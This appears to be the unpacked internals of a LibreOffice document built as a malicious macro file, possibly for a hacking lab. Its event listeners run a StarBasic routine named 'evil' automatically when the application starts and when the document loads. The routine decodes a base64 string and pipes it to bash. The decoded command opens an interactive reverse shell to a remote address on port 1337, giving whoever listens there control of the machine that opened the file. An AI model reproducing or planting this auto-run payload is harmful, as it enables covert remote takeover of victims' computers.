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Basic/Standard/shell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>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="office:start-app" xlink:href="vnd.sun.star.script:Standard.shell.evil?language=Basic&amp;location=document" xlink:type="simple"/>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.shell.evil?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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3-23T01:14:49.735956700</meta:creation-date>
    <dc:date>2025-03-23T01:28:40.895718800</dc:date>
    <meta:editing-duration>PT7M29S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/25.2.1.2$Windows_X86_64 LibreOffice_project/d3abf4aee5fd705e4a92bba33a32f40bc4e56f49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shell"/>
</library:library>
</file>

<file path=Basic/Standard/shell.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="shell" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
Sub evil

    Shell("bash -c 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjgvMTMzNyAwPiYx | base64 -d | /bin/bash'")
   
End Sub
</script:module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